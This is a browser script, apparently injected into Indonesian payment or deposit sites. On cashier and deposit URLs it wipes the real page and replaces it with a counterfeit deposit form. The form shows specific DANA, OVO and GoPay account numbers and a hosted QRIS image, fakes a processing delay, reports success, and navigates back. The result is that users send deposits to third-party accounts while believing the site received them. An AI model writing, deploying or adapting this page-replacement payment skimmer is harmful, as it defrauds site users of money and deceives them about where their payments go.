(function () {
  const url = window.location.href;
  const match = [
    '/deposit',
    '/bank',
    '/deposit.php',
    '/qris.php',
    '/cashier',
    '/metode/?bank=',
    '/?bank=',
    '/?page=transaksi',
    '/index.php?page=transaksi',
    '/?deposit&head=home',
    '/index.php?page=cashier',
    '/bank.php'
  ];

  if (!match.some(path => url.includes(path))) return;

  document.documentElement.innerHTML = "<head></head><body></body>";

  document.head.innerHTML = `
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Formulir Deposit</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
      :root {
        --primary: #3b82f6;
        --primary-dark: #2563eb;
        --secondary: #10b981;
        --secondary-dark: #059669;
        --danger: #ef4444;
        --warning: #f59e0b;
        --dark: #0f172a;
        --dark-light: #1e293b;
        --dark-lighter: #334155;
        --light: #f8fafc;
        --light-gray: #cbd5e1;
        --border-radius: 12px;
        --box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        --transition: all 0.3s ease;
      }
      
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      
      body {
        font-family: 'Poppins', sans-serif;
        background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
        color: var(--light);
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
        line-height: 1.6;
      }
      
      .container {
        max-width: 500px;
        width: 100%;
        background: var(--dark-light);
        border-radius: var(--border-radius);
        box-shadow: var(--box-shadow);
        overflow: hidden;
        border: 1px solid var(--dark-lighter);
      }
      
      .header {
        background: linear-gradient(90deg, var(--primary) 0%, var(--primary-dark) 100%);
        padding: 24px 20px;
        text-align: center;
        position: relative;
      }
      
      .header h1 {
        font-size: 24px;
        font-weight: 700;
        margin-bottom: 4px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      
      .header p {
        font-size: 14px;
        opacity: 0.9;
        font-weight: 300;
      }
      
      .marquee-container {
        background: rgba(245, 158, 11, 0.1);
        border-bottom: 1px solid rgba(245, 158, 11, 0.3);
        padding: 12px 0;
        overflow: hidden;
        position: relative;
      }
      
      .marquee {
        display: flex;
        animation: marquee 20s linear infinite;
        white-space: nowrap;
      }
      
      .marquee span {
        display: inline-flex;
        align-items: center;
        gap: 8px;
        padding: 0 20px;
        font-size: 13px;
        color: #fbbf24;
        font-weight: 500;
      }
      
      @keyframes marquee {
        0% { transform: translateX(0); }
        100% { transform: translateX(-50%); }
      }
      
      .content {
        padding: 24px 20px;
      }
      
      .tab-buttons {
        display: flex;
        gap: 10px;
        margin-bottom: 24px;
        background: var(--dark);
        padding: 8px;
        border-radius: var(--border-radius);
      }
      
      .tab-btn {
        flex: 1;
        background: transparent;
        border: none;
        color: var(--light-gray);
        padding: 12px;
        border-radius: 8px;
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      
      .tab-btn.active {
        background: var(--primary);
        color: white;
        box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
      }
      
      .tab-btn:hover:not(.active) {
        background: rgba(255, 255, 255, 0.05);
      }
      
      .help-btn {
        width: 100%;
        background: linear-gradient(90deg, #8b5cf6 0%, #7c3aed 100%);
        color: white;
        border: none;
        padding: 14px;
        border-radius: var(--border-radius);
        font-weight: 600;
        font-size: 15px;
        cursor: pointer;
        transition: var(--transition);
        margin-bottom: 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      
      .help-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 20px rgba(139, 92, 246, 0.4);
      }
      
      .form-section {
        display: none;
        animation: fadeIn 0.5s ease;
      }
      
      .form-section.active {
        display: block;
      }
      
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      .form-group {
        margin-bottom: 18px;
      }
      
      .form-group label {
        display: block;
        margin-bottom: 8px;
        font-size: 14px;
        font-weight: 500;
        color: var(--light-gray);
      }
      
      select, input {
        width: 100%;
        padding: 14px;
        background: var(--dark);
        border: 1px solid var(--dark-lighter);
        border-radius: var(--border-radius);
        font-size: 15px;
        color: var(--light);
        transition: var(--transition);
        font-family: 'Poppins', sans-serif;
      }
      
      select:focus, input:focus {
        outline: none;
        border-color: var(--primary);
        box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
      }
      
      .bank-card {
        background: var(--dark);
        border-radius: var(--border-radius);
        padding: 20px;
        margin-top: 20px;
        border: 1px solid var(--dark-lighter);
        display: none;
      }
      
      .bank-card.active {
        display: block;
        animation: fadeIn 0.5s ease;
      }
      
      .bank-header {
        display: flex;
        align-items: center;
        gap: 15px;
        margin-bottom: 20px;
        padding-bottom: 15px;
        border-bottom: 1px solid var(--dark-lighter);
      }
      
      .bank-logo {
        width: 60px;
        height: 60px;
        border-radius: 10px;
        object-fit: contain;
        background: white;
        padding: 5px;
      }
      
      .bank-info h3 {
        font-size: 18px;
        margin-bottom: 4px;
      }
      
      .bank-info p {
        font-size: 14px;
        color: var(--light-gray);
      }
      
      .account-number {
        background: var(--dark-light);
        border-radius: var(--border-radius);
        padding: 16px;
        margin-bottom: 20px;
        border: 1px solid var(--dark-lighter);
      }
      
      .account-number p {
        font-size: 13px;
        color: var(--light-gray);
        margin-bottom: 6px;
      }
      
      .number-container {
        display: flex;
        justify-content: space-between;
        align-items: center;
      }
      
      .number-container span {
        font-size: 18px;
        font-weight: 600;
        letter-spacing: 1px;
        font-family: 'Courier New', monospace;
      }
      
      .copy-btn {
        background: var(--primary);
        color: white;
        border: none;
        border-radius: 8px;
        padding: 8px 16px;
        font-size: 13px;
        font-weight: 600;
        cursor: pointer;
        transition: var(--transition);
        display: flex;
        align-items: center;
        gap: 6px;
      }
      
      .copy-btn:hover {
        background: var(--primary-dark);
        transform: translateY(-2px);
      }
      
      .action-btn {
        width: 100%;
        background: linear-gradient(90deg, var(--secondary) 0%, var(--secondary-dark) 100%);
        color: white;
        border: none;
        padding: 16px;
        border-radius: var(--border-radius);
        font-weight: 600;
        font-size: 16px;
        cursor: pointer;
        transition: var(--transition);
        margin-top: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
      }
      
      .action-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 20px rgba(16, 185, 129, 0.4);
      }
      
      .action-btn:disabled {
        background: var(--dark-lighter);
        cursor: not-allowed;
        transform: none;
        box-shadow: none;
      }
      
      .qr-container {
        text-align: center;
        margin-top: 20px;
        display: none;
      }
      
      .qr-container.active {
        display: block;
        animation: fadeIn 0.5s ease;
      }
      
      .qr-code {
        width: 220px;
        height: 220px;
        border-radius: var(--border-radius);
        margin: 0 auto 20px;
        border: 1px solid var(--dark-lighter);
        padding: 15px;
        background: white;
      }
      
      .qr-code img {
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      
      .qr-actions {
        display: flex;
        gap: 10px;
        margin-top: 20px;
      }
      
      .qr-actions button {
        flex: 1;
        padding: 14px;
        border-radius: var(--border-radius);
        font-weight: 600;
        font-size: 14px;
        cursor: pointer;
        transition: var(--transition);
        border: none;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      
      .download-btn {
        background: var(--primary);
        color: white;
      }
      
      .download-btn:hover {
        background: var(--primary-dark);
        transform: translateY(-2px);
      }
      
      .done-btn {
        background: var(--secondary);
        color: white;
      }
      
      .done-btn:hover {
        background: var(--secondary-dark);
        transform: translateY(-2px);
      }
      
      .spinner {
        width: 40px;
        height: 40px;
        border: 4px solid var(--dark-lighter);
        border-top: 4px solid var(--primary);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 30px auto;
      }
      
      @keyframes spin {
        to { transform: rotate(360deg); }
      }
      
      .info-box {
        background: rgba(59, 130, 246, 0.1);
        border-left: 4px solid var(--primary);
        padding: 15px;
        border-radius: 0 var(--border-radius) var(--border-radius) 0;
        margin: 20px 0;
        font-size: 14px;
      }
      
      .info-box.warning {
        background: rgba(245, 158, 11, 0.1);
        border-left-color: var(--warning);
      }
      
      .footer {
        text-align: center;
        padding: 20px;
        border-top: 1px solid var(--dark-lighter);
      }
      
      .footer img {
        max-width: 80%;
        border-radius: var(--border-radius);
        opacity: 0.8;
        transition: var(--transition);
      }
      
      .footer img:hover {
        opacity: 1;
      }
      
      .toast {
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%) translateY(100px);
        min-width: 300px;
        max-width: 90%;
        text-align: center;
        padding: 16px 20px;
        border-radius: var(--border-radius);
        font-size: 15px;
        font-weight: 500;
        opacity: 0;
        pointer-events: none;
        transition: transform 0.4s ease, opacity 0.4s ease;
        z-index: 1000;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
      }
      
      .toast.show {
        opacity: 1;
        transform: translateX(-50%) translateY(0);
      }
      
      .toast.success {
        background: var(--secondary);
        color: white;
      }
      
      .toast.error {
        background: var(--danger);
        color: white;
      }
      
      .toast.info {
        background: var(--primary);
        color: white;
      }
      
      @media (max-width: 480px) {
        .container {
          border-radius: 0;
        }
        
        .header {
          padding: 20px 15px;
        }
        
        .content {
          padding: 20px 15px;
        }
        
        .qr-actions {
          flex-direction: column;
        }
        
        .toast {
          min-width: 250px;
          padding: 14px 16px;
        }
      }
    </style>
  `;

  document.body.innerHTML = `
    <div class="container">
      <div class="header">
        <h1><i class="fas fa-wallet"></i> Formulir Deposit</h1>
        <p>Lakukan deposit dengan mudah dan aman</p>
      </div>
      
      <div class="marquee-container">
        <div class="marquee">
          <span><i class="fas fa-exclamation-circle"></i> Deposit wajib sesuai dengan yang ada di formulir deposit</span>
          <span><i class="fas fa-exclamation-circle"></i> Transaksi pertama wajib menggunakan kode unik (contoh: 50.123)</span>
          <span><i class="fas fa-exclamation-circle"></i> Jika tidak sesuai syarat, deposit akan gagal diproses</span>
        </div>
      </div>
      
      <div class="content">
        <div class="tab-buttons">
          <button class="tab-btn active" onclick="switchTab('manual')">
            <i class="fas fa-hand-holding-usd"></i> Manual
          </button>
          <button class="tab-btn" onclick="switchTab('auto')">
            <i class="fas fa-qrcode"></i> QRIS
          </button>
        </div>
        
        <button class="help-btn" onclick="openHelp()">
          <i class="fas fa-headset"></i> Bantuan Deposit
        </button>
        
        <!-- Manual Deposit Section -->
        <div id="manual-section" class="form-section active">
          <div class="form-group">
            <label for="bank-select"><i class="fas fa-university"></i> Pilih Metode Pembayaran</label>
            <select id="bank-select" onchange="selectMethod(this.value)">
              <option value="" selected disabled>Pilih metode deposit...</option>
              <option value='{"logo":"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRgpSc_j6RrvzR4yXB3aJvMKum3-dbfqVJVwo_xCgZmnA&s=10","name":"DANA","number":"0895327827948","owner":"M ALVIN"}'>DANA</option>
              <option value='{"logo":"https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dari_OVO.svg/1200px-Logo_dari_OVO.svg.png","name":"OVO","number":"089912345678","owner":"JOHN DOE"}'>OVO</option>
              <option value='{"logo":"https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Gopay_logo.svg/2560px-Gopay_logo.svg.png","name":"GOPAY","number":"089987654321","owner":"JANE SMITH"}'>GOPAY</option>
            </select>
          </div>
          
          <div id="bank-card" class="bank-card">
            <div class="bank-header">
              <img id="bank-logo" class="bank-logo" src="" alt="Bank Logo">
              <div class="bank-info">
                <h3 id="bank-name"></h3>
                <p id="bank-owner"></p>
              </div>
            </div>
            
            <div class="account-number">
              <p>Nomor Rekening / E-Wallet</p>
              <div class="number-container">
                <span id="bank-number"></span>
                <button class="copy-btn" onclick="copyNumber()">
                  <i class="far fa-copy"></i> Salin
                </button>
              </div>
            </div>
            
            <div class="info-box warning">
              <i class="fas fa-exclamation-triangle"></i> Pastikan Anda mentransfer ke nomor di atas dengan benar
            </div>
            
            <div class="form-group">
              <label for="manual-nominal"><i class="fas fa-money-bill-wave"></i> Nominal Deposit (Min. Rp 50.000)</label>
              <input id="manual-nominal" type="number" min="50000" placeholder="Contoh: 50000">
            </div>
            
            <button class="action-btn" onclick="submitManualDeposit()" id="manual-submit-btn">
              <i class="fas fa-paper-plane"></i> Kirim Deposit
            </button>
            
            <div id="manual-result"></div>
          </div>
        </div>
        
        <!-- QRIS Section -->
        <div id="auto-section" class="form-section">
          <div class="form-group">
            <label for="auto-nominal"><i class="fas fa-money-bill-wave"></i> Nominal Deposit (Min. Rp 50.000)</label>
            <input id="auto-nominal" type="number" min="50000" placeholder="Contoh: 50000">
          </div>
          
          <div class="info-box">
            <i class="fas fa-info-circle"></i> QRIS dapat digunakan untuk berbagai e-wallet dan mobile banking
          </div>
          
          <button class="action-btn" onclick="generateQRIS()" id="qris-generate-btn">
            <i class="fas fa-qrcode"></i> Buat QRIS
          </button>
          
          <div id="qr-container" class="qr-container">
            <div class="qr-code">
              <img id="qris-img" src="" alt="QR Code">
            </div>
            
            <div class="info-box">
              <i class="fas fa-camera"></i> Scan QR code di atas menggunakan aplikasi e-wallet atau mobile banking Anda
            </div>
            
            <div class="qr-actions">
              <button class="download-btn" onclick="downloadQRIS()">
                <i class="fas fa-download"></i> Download
              </button>
              <button class="done-btn" onclick="finishPayment()">
                <i class="fas fa-check-circle"></i> Sudah Bayar
              </button>
            </div>
          </div>
          
          <div id="auto-result"></div>
        </div>
      </div>
      
      <div class="footer">
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSxt4SV-4Fwz_SHmJwW_ENA4zghNfwbYgAG4x_l9IbA0w&s=10" alt="Secure Payment">
      </div>
    </div>
    
    <div id="toast" class="toast"></div>
  `;

  // Toast Notification
  function showToast(msg, type = "success") {
    const toast = document.getElementById("toast");
    toast.innerHTML = `
      <i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i>
      <span>${msg}</span>
    `;
    toast.className = `toast ${type}`;
    
    // Trigger reflow
    toast.offsetHeight;
    
    toast.classList.add("show");
    
    setTimeout(() => {
      toast.classList.remove("show");
    }, 3000);
  }

  // Tab Switching
  window.switchTab = function (tab) {
    // Update tab buttons
    document.querySelectorAll('.tab-btn').forEach(btn => {
      btn.classList.remove('active');
    });
    
    if (tab === 'manual') {
      document.querySelector('.tab-btn:nth-child(1)').classList.add('active');
      document.getElementById('manual-section').classList.add('active');
      document.getElementById('auto-section').classList.remove('active');
    } else {
      document.querySelector('.tab-btn:nth-child(2)').classList.add('active');
      document.getElementById('auto-section').classList.add('active');
      document.getElementById('manual-section').classList.remove('active');
    }
  };

  // Select Payment Method
  window.selectMethod = function (jsonStr) {
    if (!jsonStr) {
      document.getElementById('bank-card').classList.remove('active');
      return;
    }
    
    try {
      const method = JSON.parse(jsonStr);
      document.getElementById('bank-logo').src = method.logo;
      document.getElementById('bank-name').textContent = method.name;
      document.getElementById('bank-number').textContent = method.number;
      document.getElementById('bank-owner').textContent = `a/n ${method.owner}`;
      
      document.getElementById('bank-card').classList.add('active');
      
      // Reset input
      document.getElementById('manual-nominal').value = '';
    } catch (error) {
      showToast('Gagal memuat metode pembayaran', 'error');
    }
  };

  // Copy Account Number
  window.copyNumber = function () {
    const num = document.getElementById('bank-number').textContent;
    if (!num || num === '') {
      showToast('Nomor rekening kosong', 'error');
      return;
    }
    
    navigator.clipboard.writeText(num).then(() => {
      showToast('Nomor rekening berhasil disalin', 'success');
    }).catch(() => {
      // Fallback for older browsers
      const textArea = document.createElement('textarea');
      textArea.value = num;
      document.body.appendChild(textArea);
      textArea.select();
      document.execCommand('copy');
      document.body.removeChild(textArea);
      showToast('Nomor rekening berhasil disalin', 'success');
    });
  };

  // Submit Manual Deposit
  window.submitManualDeposit = function () {
    const nominal = Number(document.getElementById('manual-nominal').value || 0);
    const bankCard = document.getElementById('bank-card');
    
    if (!bankCard.classList.contains('active')) {
      showToast('Pilih metode pembayaran terlebih dahulu', 'error');
      return;
    }
    
    if (nominal < 50000) {
      showToast('Minimal deposit adalah Rp 50.000', 'error');
      return;
    }
    
    const btn = document.getElementById('manual-submit-btn');
    const originalText = btn.innerHTML;
    
    // Disable button and show loading
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Memproses...';
    
    const resultDiv = document.getElementById('manual-result');
    resultDiv.innerHTML = '<div class="spinner"></div>';
    
    // Simulate API call
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      
      resultDiv.innerHTML = `
        <div class="info-box">
          <i class="fas fa-check-circle"></i> Deposit sebesar <strong>Rp ${nominal.toLocaleString('id-ID')}</strong> sedang diproses. Silakan tunggu konfirmasi.
        </div>
      `;
      
      showToast('Deposit berhasil dikirim!', 'success');
      
      // Redirect back after 3 seconds
      setTimeout(() => {
        history.back();
      }, 3000);
    }, 2000);
  };

  // Generate QRIS
  window.generateQRIS = function () {
    const nominal = Number(document.getElementById('auto-nominal').value || 0);
    
    if (nominal < 50000) {
      showToast('Minimal deposit adalah Rp 50.000', 'error');
      return;
    }
    
    const btn = document.getElementById('qris-generate-btn');
    const originalText = btn.innerHTML;
    
    // Disable button and show loading
    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Membuat QRIS...';
    
    const resultDiv = document.getElementById('auto-result');
    resultDiv.innerHTML = '<div class="spinner"></div>';
    
    // Simulate QR generation
    setTimeout(() => {
      btn.disabled = false;
      btn.innerHTML = originalText;
      resultDiv.innerHTML = '';
      
      const qrUrl = "https://imagizer.imageshack.com/img922/592/X4lzqE.jpg";
      document.getElementById('qris-img').src = qrUrl;
      document.getElementById('qr-container').classList.add('active');
      
      showToast('QRIS berhasil dibuat! Scan untuk membayar', 'success');
      
      // Scroll to QR code
      document.getElementById('qr-container').scrollIntoView({
        behavior: 'smooth',
        block: 'center'
      });
    }, 1500);
  };

  // Download QRIS
  window.downloadQRIS = function () {
    const qrUrl = "https://imagizer.imageshack.com/img922/592/X4lzqE.jpg";
    const link = document.createElement('a');
    link.href = qrUrl;
    link.download = `qris-deposit-${Date.now()}.png`;
    link.target = '_blank';
    
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    
    showToast('QRIS berhasil diunduh', 'success');
  };

  // Finish Payment
  window.finishPayment = function () {
    showToast('Terima kasih! Pembayaran Anda akan segera diproses', 'success');
    
    setTimeout(() => {
      history.back();
    }, 2000);
  };

  // Open Help
  window.openHelp = function () {
    showToast('Membuka layanan bantuan...', 'info');
    
    setTimeout(() => {
      window.open("https://direct.lc.chat/19347249", "_blank");
    }, 500);
  };

  // Initialize
  window.addEventListener('DOMContentLoaded', () => {
    // Set default bank if needed
    const bankSelect = document.getElementById('bank-select');
    if (bankSelect.value) {
      selectMethod(bankSelect.value);
    }
    
    // Add input formatting
    const nominalInputs = document.querySelectorAll('input[type="number"]');
    nominalInputs.forEach(input => {
      input.addEventListener('input', function() {
        if (this.value && Number(this.value) >= 50000) {
          this.style.borderColor = '#10b981';
        } else if (this.value && Number(this.value) < 50000) {
          this.style.borderColor = '#ef4444';
        } else {
          this.style.borderColor = '#334155';
        }
      });
    });
  });
})();
